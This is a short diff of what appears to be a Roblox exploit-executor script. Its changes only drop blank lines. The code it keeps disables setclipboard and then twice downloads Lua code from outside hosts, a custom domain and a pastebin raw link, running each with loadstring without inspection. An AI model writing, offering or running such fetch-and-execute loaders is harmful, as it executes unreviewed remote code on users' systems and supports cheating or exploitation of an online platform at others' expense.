@@ -1,7 +1,5 @@
 setclipboard = function() end
-
 getgenv().gui = false
 loadstring(game:HttpGet("https://egorikusa.space/78edf043b5e66d98257bab31.lua", true))()
-
 getgenv().gui = true
 loadstring(game:HttpGet("https://pastebin.com/raw/604j2R53",true))()
